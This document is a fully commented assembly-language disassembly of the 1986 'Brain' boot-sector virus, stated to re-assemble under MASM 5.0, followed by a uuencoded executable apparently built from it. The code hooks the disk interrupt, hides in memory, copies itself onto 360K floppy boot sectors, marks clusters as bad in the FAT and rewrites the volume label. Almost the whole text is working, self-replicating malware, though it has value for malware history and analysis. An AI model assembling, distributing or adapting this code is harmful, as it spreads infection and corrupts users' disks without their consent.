    page    65,132
    title   The 'Brain' Virus - Variety 1

    ; The virus consists of a boot sector and six consecutive sectors on
    ; a 360K floppy disk.  These sectors are flagged as bad clusters in
    ; the FAT.  The first of these sectors contains the original boot
    ; sector, and there is a pointer to this sector in the boot sector.
    ; The other sectors contain the rest of the code.

    ; The disassembly has been tested by re-assembly using MASM 5.0.

    ; The program requires an origin address of 7C00H for the first sector
    ; to load and run as a boot sector.

RAM SEGMENT AT 0

    ; System data

    ORG 4CH
BW004C  DW  ?           ; Interrupt 19 (13H) offset
BW004E  DW  ?           ; Interrupt 19 (13H) segment
    ORG 1B4H
BW01B4  DW  ?           ; Interrupt 109 (6DH) offset
BW01B6  DW  ?           ; Interrupt 109 (6DH) segment
    ORG 413H
BW0413  DW  ?           ; Total RAM size

RAM ENDS

CODE    SEGMENT BYTE PUBLIC 'CODE'
    ASSUME CS:CODE,DS:CODE

START:  CLI
    JMP BP0010

    DW  1234H           ; Identification word

INIHED  DB  0           ; Initial head number
INITRS  DW  2207H           ; Initial track and sector
CURHED  DB  0           ; Current head number
CURTRS  DW  1           ; Current track and sector

    DB  3 DUP (0), ' '

    DB  '      Welcome to the Dungeon                    '
    DB  '                 (c) 1986 Basit & Amjad (pvt) Lt'
    DB  'd.               BRAIN COMPUTER SERVICES..730 NI'
    DB  'ZAM BLOCK ALLAMA IQBAL TOWN                LAHOR'
    DB  'E-PAKISTAN..PHONE :430791,443248,280530.        '
    DB  '  Beware of this VIRUS.....Contact us for vaccin'
    DB  'ation............... $#@%$@!! '

    ; Initial load of rest of virus

BP0010: MOV AX,CS           ; \
    MOV DS,AX           ;  ) Make segment registers same as DS
    MOV SS,AX           ; /
    MOV SP,0F000H
    STI
    MOV AL,INIHED+7C00H     ; Get initial head number
    MOV CURHED+7C00H,AL     ; Save as current head number
    MOV CX,INITRS+7C00H     ; Get initial track and sector
    MOV CURTRS+7C00H,CX     ; Save as current track and sector
    CALL    BP0060          ; Address to next sector
    MOV CX,5            ; Number of sectors to read
    MOV BX,7E00H        ; Address to end of first section
BP0020: CALL    BP0030          ; Read a sector
    CALL    BP0060          ; Address to next sector
    ADD BX,200H         ; Address up length of sector
    LOOP    BP0020          ; Read 5 sectors

    ; Hide virus in top part of memory

    assume ds:RAM

    MOV AX,BW0413       ; Get total RAM size
    SUB AX,7            ; Subtract 7K
    MOV BW0413,AX       ; Replace total RAM size
    MOV CL,6            ; Number of bits to move
    SHL AX,CL           ; Convert to segment address
    MOV ES,AX           ; Load new segment address
    MOV SI,7C00H        ; Load current offset
    MOV DI,0            ; Load target offset
    MOV CX,1004H        ; Load length to move
    CLD
    REPZ    MOVSB           ; Move to new location
    PUSH    ES          ; Push new segment
    MOV AX,OFFSET BP0080    ; Offset of second section
    PUSH    AX          ; Push new offset
    RETF                ; Transfer control to second section

    ; Read routine for initial load

BP0030: PUSH    CX
    PUSH    BX
    MOV CX,4            ; Number of retries
BP0040: PUSH    CX          ; Save number of retries
    MOV DH,CURHED+7C00H     ; Get head number
    MOV DL,0            ; Drive A
    MOV CX,CURTRS+7C00H     ; Get current track and sector
    MOV AX,201H         ; Read one sector
    INT 13H         ; Disk I/O
    JNB BP0050          ; Return if no error
    MOV AH,0            ; Initialise disk sub-system
    INT 13H         ; Disk I/O
    POP CX          ; Recover number of retries
    LOOP    BP0040          ; Retry
    INT 18H         ; Basic Loader

    ; Return for initial load routine

BP0050: POP CX
    POP BX
    POP CX
    RET

    ; Address to next sector (initial load)

BP0060: MOV AL,BYTE PTR CURTRS+7C00H ; Get current sector
    INC AL          ; Increment current sector
    MOV BYTE PTR CURTRS+7C00H,AL ; Replace current sector
    CMP AL,0AH          ; Test for past last sector
    JNE BP0070          ; Return if not
    MOV BYTE PTR CURTRS+7C00H,1 ; Set sector to first
    MOV AL,CURHED+7C00H     ; Get head number
    INC AL          ; Increment head number
    MOV CURHED+7C00H,AL     ; Replace head number
    CMP AL,2            ; Test for past last head
    JNE BP0070          ; Return if not
    MOV CURHED+7C00H,0      ; Set head number to zero
    INC BYTE PTR CURTRS+7C00H+1 ; Address next track
BP0070: RET

    ; Rubbish at the end of first sector

    DB  000H, 000H, 000H, 000H, 032H, 0E3H, 023H, 04DH
    DB  059H, 0F4H, 0A1H, 082H, 0BCH, 0C3H, 012H, 000H
    DB  07EH, 012H, 0CDH, 021H, 0A2H, 03CH, 05FH

CODPTR  DW  050CH           ; Coded pointer

    ; End of first sector, start of second

BP0080: JMP SHORT BP0090

    DB  '(c) 1986 Basit & Amjads (pvt) Ltd '
    DB  0

IFNCNT  DB  4           ; Count
DRIVNO  DB  0           ; Drive number
SWITCH  DB  0           ; Switch: 0=off,
                    ;     1=installed
                    ;     2=newly installed

    ; Install interrupts

    ASSUME  DS:RAM
BP0090: MOV IFNCNT,1FH      ; Set up initial count
    XOR AX,AX           ; \ Address zero
    MOV DS,AX           ; /
    MOV AX,BW004C       ; Get Int 13H offset
    MOV BW01B4,AX       ; Store as Int 6DH offset
    MOV AX,BW004E       ; Get Int 13H segment
    MOV BW01B6,AX       ; Store as Int 6DH segment
    MOV AX,OFFSET BP0120    ; Get address of Int 13H routine
    MOV BW004C,AX       ; Put in Int 13H offset
    MOV AX,CS           ; Get segment
    MOV BW004E,AX       ; Put in Int 13H segment

    ; Read real boot sector and pass control

    MOV CX,4            ; Number of retries
    XOR AX,AX           ; \ Set ES to zero
    MOV ES,AX           ; /
BP0100: PUSH    CX          ; Save number of retries
    MOV DH,INIHED       ; Initial head number
    MOV DL,0            ; Drive A
    MOV CX,INITRS       ; Initial track and sector
    MOV AX,201H         ; Read one sector
    MOV BX,7C00H        ; Boot sector buffer address
    INT 6DH         ; Original disk I/O interrupt
    JNB BP0110          ; Branch if no error
    MOV AH,0            ; Reset disk sub-system
    INT 6DH         ; Original disk I/O interrupt
    POP CX          ; Recover number of retries
    LOOP    BP0100          ; Retry
    INT 18H         ; Basic Loader

BP0110: DB  0EAH            ; Far jump to boot sector
    DW  7C00H, 0

    NOP

    ; Interrupt 13H routine

BP0120: STI
    CMP AH,2            ; Test for read
    JNE BP0140          ; Pass to BIOS if not
    CMP DL,2            ; Test drive number
    JA  BP0140          ; Pass to BIOS if not floppy
    CMP CH,0            ; Test track number 0
    JNE BP0130          ; Branch if not
    CMP DH,0            ; Test head number 0
    JE  BP0150          ; Branch if yes
BP0130: DEC IFNCNT          ; Decrement count
    JNE BP0140          ; Pass to BIOS if count not zero
    JMP SHORT BP0150

BP0140: JMP BP0240          ; Pass to BIOS

    ; Read boot sector into boot sector store

BP0150: MOV SWITCH,0        ; Switch off
    MOV IFNCNT,4        ; Reset count to 4
    PUSH    AX
    PUSH    BX
    PUSH    CX
    PUSH    DX
    MOV DRIVNO,DL       ; Save drive number
    MOV CX,4            ; Number of retries
BP0160: PUSH    CX          ; Save number of retries
    MOV AH,0            ; Reset disk sub-system
    INT 6DH         ; Original disk I/O interrupt
    JB  BP0170          ; Branch if error
    MOV DH,0            ; Head zero
    MOV CX,1            ; Track zero, sector 1
    MOV BX,OFFSET STORE     ; Address boot sector store
    PUSH    ES
    MOV AX,CS           ; \ Set ES to CS
    MOV ES,AX           ; /
    MOV AX,201H         ; Read one sector
    INT 6DH         ; Original disk I/O interrupt
    POP ES
    JNB BP0180          ; Branch if no error
BP0170: POP CX          ; Recover number of retries
    LOOP    BP0160          ; Retry
    JMP BP0210

    ; See if already installed

BP0180: POP CX
    MOV AX,WORD PTR CS:STORE+4  ; Get identification number
    CMP AX,1234H        ; See if already installed
    JNE BP0190          ; Branch if not
    MOV SWITCH,1        ; Set already installed switch
    JMP SHORT BP0220

    ; Instal virus

BP0190: PUSH    DS
    PUSH    ES
    MOV AX,CS           ; \
    MOV DS,AX           ;  ) Make segment regs equal
    MOV ES,AX           ; /
    PUSH    SI
    CALL    BP0640          ; Write virus to disk
    JB  BP0200          ; Branch if error
    MOV SWITCH,2        ; Set just installed switch
    CALL    BP0480          ; Process root directory
BP0200: POP SI
    POP ES
    POP DS
    JNB BP0220          ; Branch if no error
BP0210: MOV AH,0            ; Reset disk sub-system
    INT 6DH         ; Original disk I/O interrupt
BP0220: POP DX
    POP CX
    POP BX
    POP AX
    CMP CX,1            ; Track zero, sector 1
    JNE BP0240          ; Pass to BIOS
    CMP DH,0            ; Side zero
    JNE BP0240          ; Pass to BIOS
    CMP SWITCH,1        ; Test already installed
    JNE BP0230          ; Branch if not
    MOV CX,WORD PTR CS:STORE+7  ; Initial track and sector
    MOV DX,WORD PTR CS:STORE+5  ; Initial head
    MOV DL,DRIVNO       ; Get drive number
    JMP SHORT BP0240        ; Pass to BIOS

BP0230: CMP SWITCH,2        ; Test just installed switch
    JNE BP0240          ; Pass to BIOS
    MOV CX,INITRS       ; Initial track and sector
    MOV DH,INIHED       ; Initial head number
BP0240: INT 6DH         ; Original disk I/O interrupt
    RETF    2           ; End of interrupt

    DB  15 DUP (0)

    ; Process disk before installing virus

BP0250: JMP BP0260

FREECL  DW  3           ; Consecutive free clusters

    DB  ' (c) 1986 Basit & Amjads (pvt) Ltd'

    ASSUME  DS:CODE

    ; Get FATs

BP0260: CALL    BP0400          ; Read FATs
    MOV AX,WORD PTR STORE   ; Get first word of sector
    CMP AX,0FFFDH       ; Start of FAT
    JE  BP0270          ; Branch if the right format
    MOV AL,3            ; Flag type of error
    STC             ; Indicate error condition
    RET

    ; Find three consecutive entries

BP0270: MOV CX,37H          ; Leave room for system files
    MOV FREECL,0        ; Cluster count to zero
BP0280: CALL    BP0360          ; Get FAT entry
    CMP AX,0            ; Is cluster free
    JNE BP0290          ; Branch if not
    INC FREECL          ; Add to found count
    CMP FREECL,3        ; Have we got three
    JNE BP0300          ; Branch if not
    JMP BP0310          ; Flag the clusters

    ; Not found yet

BP0290: MOV FREECL,0        ; Reset cluster found count
BP0300: INC CX          ; Next cluster
    CMP CX,163H         ; Have we reached the end
    JNE BP0280          ; Process if not
    MOV AL,1            ; Flag type of error
    STC             ; Indicate error condition
    RET

    ; Mark clusters

BP0310: MOV DL,3            ; Cluster count
BP0320: CALL    BP0330          ; Mark cluster as bad
    DEC CX          ; Back one cluster
    DEC DL          ; Subtract from count
    JNZ BP0320          ; Process next
    INC CX          ; Back to first found cluster
    CALL    BP0460          ; Convert cluster no to address
    CALL    BP0410          ; Write FATs
    MOV AL,0            ; Type of error = none
    CLC             ; No error
    RET

    ; Mark cluster as bad

BP0330: PUSH    CX
    PUSH    DX
    MOV SI,OFFSET STORE     ; Address boot sector store
    MOV AL,CL           ; Copy entry number
    SHR AL,1            ; Bottom bit to carry flag
    JB  BP0340          ; Branch if entry is even
    CALL    BP0390          ; Calculate FAT entry disp
    MOV AX,[BX+SI]      ; Load entry
    AND AX,0F000H       ; Clear FAT entry
    OR  AX,0FF7H        ; Bad cluster
    JMP BP0350

    ; Mark as bad, even number cluster

BP0340: CALL    BP0390          ; Calculate FAT entry disp
    MOV AX,[BX+SI]      ; Load entry
    AND AX,0FH          ; Clear FAT entry
    OR  AX,0FF70H       ; Bad cluster
BP0350: MOV [BX+SI],AX      ; Replace bad cluster marker
    MOV [BX+SI+0400H],AX    ; And in the other FAT
    POP DX
    POP CX
    RET

    ; Get FAT entry

BP0360: PUSH    CX
    MOV SI,OFFSET STORE     ; Address boot sector store
    MOV AL,CL           ; Copy entry number
    SHR AL,1            ; Bottom bit to carry flag
    JB  BP0370          ; Branch if entry is even
    CALL    BP0390          ; Calculate FAT entry disp
    MOV AX,[BX+SI]      ; Load entry
    AND AX,0FFFH        ; Isolate FAT entry
    JMP BP0380

    ; Get FAT entry, even number cluster

BP0370: CALL    BP0390          ; Calculate FAT entry disp
    MOV AX,[BX+SI]      ; Load entry
    AND AX,0FFF0H       ; Isolate FAT entry
    MOV CL,4            ; Number of bits to move
    SHR AX,CL           ; Align FAT entry
BP0380: POP CX
    RET

    ; Calculate FAT entry displacement

BP0390: PUSH    DX
    MOV AX,3            ; Length of 2 FAT entries
    MUL CX          ; Multiply by number
    SHR AX,1            ; Divide by two
    MOV BX,AX           ; Save result
    POP DX
    RET

    ; Read FATs

BP0400: MOV AH,2            ; Read sub-function
    CALL    BP0420          ; Read or write FATs
    RET

    ; Write FATs

BP0410: MOV AH,3            ; Write sub-function
    CALL    BP0420          ; Read or write FATs
    RET

    ; Read or write both FATs

BP0420: MOV CX,4            ; Number of retries
BP0430: PUSH    CX          ; Save number of retries
    PUSH    AX
    MOV AH,0            ; Reset disk sub-system
    INT 6DH         ; Original disk I/O interrupt
    POP AX
    JB  BP0440          ; Branch if error
    MOV BX,OFFSET STORE     ; Address boot sector store
    MOV AL,4            ; 4 sectors
    MOV DH,0            ; Head zero
    MOV DL,DRIVNO       ; Get drive number
    MOV CX,2            ; Track zero, sector 2
    PUSH    AX
    INT 6DH         ; Original disk I/O interrupt
    POP AX
    JNB BP0450          ; Branch if no error
BP0440: POP CX          ; Recover number of retries
    LOOP    BP0430          ; Retry
    POP AX
    POP AX
    MOV AL,2            ; Flag type of error
    STC             ; Indicate error condition
    RET

BP0450: POP CX
    RET

    ; Convert cluster number to address

BP0460: PUSH    CX          ; Save cluster number
    SUB CX,2            ; Subtract 2
    SHL CX,1            ; Double it
    ADD CX,12           ; Add 12
    MOV AX,CX           ; Save sector number
    MOV CL,12H          ; Sectors per track (both sides)
    DIV CL          ; Calculate track number
    MOV BYTE PTR INITRS+1,AL    ; Save track number
    MOV INIHED,0        ; Initial head number
    INC AH          ; Sectors start from 1
    CMP AH,9            ; Is it head 0
    JBE BP0470          ; Branch if yes
    SUB AH,9            ; Calculate sector number
    MOV INIHED,1        ; Initial head number
BP0470: MOV BYTE PTR INITRS,AH  ; Initial sector
    POP CX
    RET

    DB  6 DUP (0)

DSKFNC  DB  3           ; Disk I/O sub-function
DIRENT  DW  66H         ; Directory entries to process
REGST1  DW  303H            ; Temporary register store (1)
REGST2  DW  0EBEH           ; Temporary register store (2)
REGST3  DW  1           ; Temporary register store (3)
REGST4  DW  100H            ; Temporary register store (4)

    ; This section decrypts to ' (c) ashar ' by taking the complement of
    ; each character and adding one

    DB  0E0H, 0D8H, 09DH, 0D7H, 0E0H, 09FH, 08DH, 098H
    DB  09FH, 08EH, 0E0H

    DB  ' (c) Brain $'

    ; Process root directory

BP0480: CALL    BP0560          ; Read root directory
    JB  BP0490          ; Branch if error
    PUSH    DI
    CALL    BP0500
    POP DI
    JB  BP0490
    CALL    BP0570          ; Write root directory
BP0490: RET

    ; Unused rubbish

    DB  0BBH, 09BH, 004H, 0B9H, 00BH, 000H, 08AH, 007H
    DB  0F6H, 0D8H, 088H, 004H, 046H, 043H, 0E2H, 0F6H
    DB  0B0H, 008H, 088H, 004H, 0F8H, 0C3H, 0C6H, 006H

    ; Find Volume Label, or first unused entry

BP0500: MOV DIRENT,6CH      ; No of root dir entries - 4
    MOV SI,OFFSET STORE+40H ; Third directory entry
    MOV REGST1,DX       ; - serves no function
    MOV AX,DIRENT       ; Recover no of directory entries
    SHR AX,1            ; Divide by two (36H)
    MOV REGST3,AX       ; Save to decode address
    SHR AX,1            ; Divide by two (1BH)
    MOV REGST2,AX       ; Save
    XCHG    CX,AX           ; - serves no function
    AND CL,43H          ; - serves no function
    MOV DI,REGST2       ; Reload number
    ADD DI,1E3H         ; Turn into 1FEH (CODPTR)
BP0510: MOV AL,[SI]         ; Get first byte of entry
    CMP AL,0            ; Is entry unused
    JE  BP0520          ; Branch if yes
    MOV AL,[SI+11]      ; Get file attribute
    AND AL,8            ; Switch off all but Vol Label
    CMP AL,8            ; Is entry a Vol Label
    JE  BP0520          ; Branch if yes
    ADD SI,20H          ; Address to next entry
    DEC DIRENT          ; Deduct from entry count
    JNZ BP0510          ; Process next entry
    STC             ; Indicate error condition
    RET

    DB  08BH

    ; Unused entry or Volume label found

; The code from 053AH to 054CH serves a double purpose as code
; and as coded characters, which become the disk label in reverse.
; The result of decoding the characters is shown after the '-'.
; Any code with no comment before the '-' serves no function as code.

BP0520: MOV BX,[DI]         ; Load coded address (050CH)
    XOR BX,REGST3       ; Convert to 053AH
    MOV REGST3,SI       ; Save directory entry address
    CLI             ; No interrupts
    MOV AX,SS           ; \ Save stack segment
    MOV REGST1,AX       ; /
    MOV REGST2,SP       ; Save stack pointer
    MOV AX,CS           ; \ Set SS to CS value
    MOV SS,AX           ; /
    MOV SP,REGST3       ; Point stack pointer to entry
    ADD SP,0CH          ; Address to end of name
    MOV CL,51H          ; - coded , 'n'
    ADD DX,444CH        ; - coded , , 'i', 'a'
    MOV DI,2555H        ; - coded , 'r', 'B'
    MOV CX,0C03H        ; - coded , ' ', ')'
    REPZ    CMPSW           ; - coded , 
    MOV AX,0B46H        ; Load coded number - , 'c', '('
    MOV CX,3            ; Bits to shift - , ' '
    ROL AX,CL           ; AX now 5A30H
    MOV REGST3,AX       ; Save this
    MOV CX,5            ; Number of words to process
    MOV DX,8            ; - serves no function
    SUB REGST3,5210H        ; Store now 0820H
    PUSH    REGST3          ; Last byte blank, and label flag
BP0530: MOV AH,[BX]         ; Get next byte
    INC BX          ; Increment pointer
    MOV DL,AH           ; Copy character
    SHL DL,1            ; Shift top bit to carry
    JB  BP0530          ; Ignore character if set
BP0540: MOV DL,[BX]         ; Get next byte
    INC BX          ; Increment pointer
    MOV AL,DL           ; Move into position
    SHL DL,1            ; Shift top bit to carry
    JB  BP0540          ; Ignore character if set
    ADD AX,1D1DH        ; Convert to correct characters
    PUSH    AX          ; Two bytes of label
    INC REGST3          ; - serves no function
    JNB BP0550          ; Jump always taken
    DB  0EAH            ; - serves no function
BP0550: LOOP    BP0530          ; repeat for next character pair
    MOV SP,REGST2       ; Restore stack pointer
    MOV AX,REGST1       ; \ Restore stack segment
    MOV SS,AX           ; /
    STI             ; Allow interrupts again
    ADD DH,[BP+SI]      ; - serves no function
    CLC             ; No error
    RET

    ; Read root directory

BP0560: MOV DSKFNC,2        ; Read sub-function
    JMP BP0580

    ; Write root directory

BP0570: MOV DSKFNC,3        ; Write sub-function
    JMP BP0580

    ; Read or write root directory

BP0580: MOV DH,0            ; Head zero
    MOV DL,DRIVNO       ; Get drive number
    MOV CX,6            ; Track zero, sector 6
    MOV AH,DSKFNC       ; Get disk I/O sub-function
    MOV AL,4            ; Four sectors
    MOV BX,OFFSET STORE     ; Address boot sector store
    CALL    BP0600          ; Disk I/O
    JB  BP0590          ; Branch if error
    MOV CX,1            ; Track zero, sector one
    MOV DH,1            ; Head one
    MOV AH,DSKFNC       ; Get disk I/O sub-function
    MOV AL,3            ; Three sectors
    ADD BX,800H         ; Address past 4 already read
    CALL    BP0600          ; Disk I/O
BP0590: RET

    ; Disk I/O for root directory

BP0600: MOV REGST1,AX       ; \
    MOV REGST2,BX       ;  \ Save registers
    MOV REGST3,CX       ;  /
    MOV REGST4,DX       ; /
    MOV CX,4            ; Number of retries
BP0610: PUSH    CX          ; Save number of retries
    MOV AH,0            ; Reset disk sub-system
    INT 6DH         ; Original disk I/O interrupt
    JB  BP0620          ; Branch if error
    MOV AX,REGST1       ; \
    MOV BX,REGST2       ;  \ Restore registers
    MOV CX,REGST3       ;  /
    MOV DX,REGST4       ; /
    INT 6DH         ; Original disk I/O interrupt
    JNB BP0630          ; Branch if no error
BP0620: POP CX          ; Recover number of retries
    LOOP    BP0610          ; Retry
    STC             ; Indicate error condition
    RET

BP0630: POP CX
    RET

    DB  3 DUP (0)

NUMSEC  DW  3
AXSTOR  DW  301H            ; AX store (sub-function, 

    ; Write virus to disk

BP0640: CALL    BP0250          ; Process disk
    JB  BP0660          ; Branch if error
    MOV CURTRS,1        ; Current track and sector
    MOV CURHED,0        ; Current head number
    MOV BX,OFFSET STORE     ; Address boot sector store
    CALL    BP0670          ; Read boot one sector
    MOV BX,OFFSET STORE     ; Address boot sector store
    MOV AX,INITRS       ; Initial track and sector
    MOV CURTRS,AX       ; Current track and sector
    MOV AH,INIHED       ; Initial head number
    MOV CURHED,AH       ; Current head number
    CALL    BP0680          ; Write a sector
    CALL    BP0720          ; Get next sector number
    MOV CX,5            ; Number of sectors
    MOV BX,200H         ; Address second sector
BP0650: MOV NUMSEC,CX       ; Save number of sectors
    CALL    BP0680          ; Write a sector
    CALL    BP0720          ; Get next sector number
    ADD BX,200H         ; Address next sector
    MOV CX,NUMSEC       ; Recover number of sectors
    LOOP    BP0650          ; Repeat for five sectors
    MOV CURHED,0        ; Current head number
    MOV CURTRS,1        ; Current track and sector
    MOV BX,0            ; Address to beginning
    CALL    BP0680          ; Write 'boot' sector
    CLC             ; No error
BP0660: RET

    ; Read a sector

BP0670: MOV AXSTOR,201H     ; Read one sector
    JMP BP0690

    ; Write a sector

BP0680: MOV AXSTOR,301H     ; Write one sector
    JMP BP0690

    ; Read or write a sector

BP0690: PUSH    BX
    MOV CX,4            ; Number of retries
BP0700: PUSH    CX          ; Save number of retries
    MOV DH,CURHED       ; Current head number
    MOV DL,DRIVNO       ; Get drive number
    MOV CX,CURTRS       ; Current track and sector
    MOV AX,AXSTOR       ; Get sub-function
    INT 6DH         ; Original disk I/O interrupt
    JNB BP0710          ; Branch if no error
    MOV AH,0            ; Reset disk sub-system
    INT 6DH         ; Original disk I/O interrupt
    POP CX          ; Recover number of retries
    LOOP    BP0700          ; Retry
    POP BX
    POP BX
    STC             ; Indicate error condition
    RET

BP0710: POP CX
    POP BX
    RET

    ; Get next sector number

BP0720: INC BYTE PTR CURTRS     ; Current sector
    CMP BYTE PTR CURTRS,0AH ; Current sector
    JNE BP0730
    MOV BYTE PTR CURTRS,1   ; Current sector
    INC CURHED          ; Current head number
    CMP CURHED,2        ; Current head number
    JNE BP0730
    MOV CURHED,0        ; Current head number
    INC BYTE PTR CURTRS+1   ; Current track
BP0730: RET

    DB  064H, 074H, 061H

        ; Disk input store

STORE   EQU $

CODE    ENDS

    END START

begin 775 brain-v1.exe
M35K'``4````@````__\`````````````/@````$`^U!J<@``````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M``````````````````````#ZZ4H!-!(`!R(``0`````@("`@("`@5V5L8V]M
M92!T;R!T:&4@1'5N9V5O;B`@("`@("`@("`@("`@("`@("`@("`@("`@("`@
M("`@("`@("`H8RD@,3DX-B!"87-I="`F($%M:F%D("AP=G0I($QT9"X@("`@
M("`@("`@("`@("!"4D%)3B!#3TU0551%4B!315)624-%4RXN-S,P($Y)6D%-
M($),3T-+($%,3$%-02!)44)!3"!43U=.("`@("`@("`@("`@("`@($Q!2$]2
M12U004M)4U1!3BXN4$A/3D4@.C0S,#<,``N+TH1,$+0<`HQ,$
ML0;3X([`O@!\OP``N000_/.D!K@)`E#+45.Y!`!1+HHV"7RR`"Z+#@I\N`$"
MS1-S";0`S1-9XN7-&%E;6<,NH`I\_L`NH@I\/`IU'R[&!@I\`2Z@"7S^P"ZB
M"7P\`G4++L8&"7P`+OX&"WS#`````#+C(TU9]*&"O,,2`'X2S2&B/%\,!>LF
M*&,I(#$Y.#8@0F%S:70@)B!!;6IA9',@*'!V="D@3'1D(``$```NQ@8N`A\S
MP([8H4P`H[0!H4X`H[8!N'\"HTP`C,BC3@"Y!``SP([`42Z*-@8`L@`NBPX'
M`+@!`KL`?,UM+BS1CJ`'P``)#[@/P"=1B`^@)W$X#]`'4%@/X`
M=`PN_@XN`G4"ZP/II0`NQ@8P`@`NQ@8N`@104U%2+H@6+P*Y!`!1M`#-;7(5
MM@"Y`0"[QP8&C,B.P+@!`LUM!W,&6>+AZR^062ZARP8]-!)U""[&!C`"`>L@
M'@:,R([8CL!6Z!4#<@DNQ@8P`@+HN`%>!Q]S!+0`S6U:65M8@_D!=3"`_@!U
M*RZ`/C`"`741+HL.S@8NBQ;,!BZ*%B\"ZQ(N@#XP`@)U"BZ+#@<`+HHV!@#-
M;<`X,^7`,#=0GK$I#'!EP#``!!@?EC`77=L`'YP[(#Z!``2?[*=?A!Z)H`
MZ&8`L`#XPU%2OL<&BL'0Z'(.Z$(`BP`E`/`-]P_K#)#H-`"+`"4/``UP_XD`
MB8``!%I9PU&^QP:*P=#H<@OH%@"+`"7_#^L-D.@+`(L`)?#_L033Z%G#4K@#
M`/?AT>B+V%K#M`+H!P##M`/H`0##N00`45"T`,UM6'(4N\<&L`2V`(H6+P*Y
M`@!0S6U8<-9PU&#Z0+1X8/!#(O!L1+V\:((`,8&!@``_L2`
M_`EV"(#L"<8&!@`!B"8'`%G#`````````V8``P.^#@$```'@V)W7X)^-F)^.
MX"`H8RD@0G)A:6X@).C;`'(*5^@?`%]R`^C7`,.[FP2Y"P"*!_;8B`1&0^+V
ML`B(!/C#Q@;'!IH$;`"^!P>)%IP$H9H$T>BCH`31Z*.>!)&`X4.+/IX$@!(L.H`2+%J($S6US!5GBX_G#6<,````#``$#Z$G]<&"@`!`+L``.@+`/C#QP8+!@$"ZPJ0
MQP8+!@$#ZP&04[D$`%&*-@D`BA8O`HL."@"A"P;-;7,+M`#-;5GBY5M;^<-9
J6\/^!@H`@#X*``IU&<8&"@`!_@8)`(`^"0`"=0G&!@D``/X&"P##9'1A
`
end